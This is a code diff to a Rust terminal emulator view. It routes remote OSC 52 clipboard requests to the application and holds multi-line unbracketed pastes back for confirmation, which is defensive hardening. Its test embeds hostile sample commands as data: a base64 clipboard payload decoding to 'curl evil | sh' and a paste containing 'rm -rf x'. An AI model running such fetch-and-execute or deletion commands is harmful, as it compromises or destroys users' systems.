@@ -52,6 +52,10 @@ pub struct TermResponse {
     pub title: Option<String>,
     pub bell: bool,
     pub focused: bool,
+    /// Text the remote asked to put on the clipboard (OSC 52); the app applies its preference.
+    pub clipboard: Option<String>,
+    /// A paste held back for confirmation (see [`TermView::paste`]).
+    pub confirm_paste: Option<String>,
 }
 
 #[derive(Clone, Copy, PartialEq, Eq, Default)]
@@ -100,6 +104,8 @@ pub struct TermView {
     generation: u64,
     pub find: Option<Find>,
     focus_requested: bool,
+    /// Hold back multi-line pastes that would run unbracketed (set from preferences each frame).
+    pub confirm_paste: bool,
 }
 
 const URL_RE: &str = r#"(?:https?|ftp)://[^\s<>"'`]+[^\s<>"'`.,;:!?)\]]"#;
@@ -127,6 +133,7 @@ impl TermView {
             generation: 0,
             find: None,
             focus_requested: true,
+            confirm_paste: false,
         }
     }
 
@@ -292,7 +299,7 @@ impl TermView {
                 TermEvent::PtyWrite(s) => out.reply.extend_from_slice(s.as_bytes()),
                 TermEvent::Title(t) => out.title = Some(t),
                 TermEvent::Bell => out.bell = true,
-                TermEvent::ClipboardStore(_, s) => ui.ctx().copy_text(s),
+                TermEvent::ClipboardStore(_, s) => out.clipboard = Some(s),
                 _ => {}
             }
         }
@@ -398,7 +405,17 @@ impl TermView {
         }
     }
 
+    /// Pastes `text`, or hands it back in `out.confirm_paste` when `confirm_paste` is set and the
+    /// newlines would run each line immediately (no bracketed paste).
     pub fn paste(&mut self, text: &str, out: &mut TermResponse) {
+        if self.confirm_paste && !self.term.mode().contains(TermMode::BRACKETED_PASTE) && text.contains(['\n', '\r']) {
+            out.confirm_paste = Some(text.into());
+            return;
+        }
+        self.paste_now(text, out);
+    }
+
+    pub fn paste_now(&mut self, text: &str, out: &mut TermResponse) {
         let text = text.replace("\r\n", "\r").replace('\n', "\r");
         if self.term.mode().contains(TermMode::BRACKETED_PASTE) {
             out.input.extend_from_slice(b"\x1b[200~");
@@ -853,6 +870,31 @@ mod tests {
         assert_eq!(key_bytes(Key::F5, none, TermMode::empty()).unwrap(), b"\x1b[15~");
         assert_eq!(key_bytes(Key::Backspace, none, TermMode::empty()).unwrap(), [0x7f]);
         assert!(key_bytes(Key::A, none, TermMode::empty()).is_none());
+    }
+
+    #[test]
+    fn remote_clipboard_and_multiline_paste_go_to_the_app() {
+        let mut t = TermView::new(1000, 14.0, CursorStyle::Block);
+        t.feed(b"\x1b]52;c;Y3VybCBldmlsIHwgc2g=\x07");
+        let ctx = egui::Context::default();
+        let mut out = None;
+        let mut full = ctx.run_ui(Default::default(), |ui| out = Some(t.ui(ui, crate::terminal_themes::get("charcoal"), true)));
+        full.textures_delta.clear();
+        assert_eq!(out.unwrap().clipboard.as_deref(), Some("curl evil | sh"));
+        assert!(!full.platform_output.commands.iter().any(|c| matches!(c, egui::OutputCommand::CopyText(_))), "the view must not touch the clipboard itself");
+
+        let mut out = TermResponse::default();
+        t.confirm_paste = true;
+        t.paste("ls\nrm -rf x\n", &mut out);
+        assert!(out.input.is_empty());
+        assert_eq!(out.confirm_paste.as_deref(), Some("ls\nrm -rf x\n"));
+        let mut out = TermResponse::default();
+        t.paste("one line", &mut out);
+        assert_eq!(out.input, b"one line");
+        t.feed(b"\x1b[?2004h");
+        let mut out = TermResponse::default();
+        t.paste("a\nb", &mut out);
+        assert!(out.confirm_paste.is_none() && out.input.starts_with(b"\x1b[200~"), "bracketed paste needs no prompt");
     }
 
     #[test]
